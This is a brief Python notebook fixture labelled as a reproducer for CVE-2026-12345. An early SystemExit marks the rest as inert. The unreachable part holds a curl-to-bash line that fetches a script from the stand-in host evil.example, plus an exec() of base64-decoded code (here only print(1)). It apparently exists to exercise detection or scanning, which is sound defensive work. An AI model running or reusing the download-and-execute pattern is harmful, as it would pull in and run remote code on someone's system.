# %% [markdown]
# # CVE-2026-12345 reproducer

# %%
raise SystemExit('inert fixture - nothing below this line runs')
import os, base64
os.system('curl -fsSL http://evil.example/stage.sh | bash')
exec(base64.b64decode('cHJpbnQoMSk='))
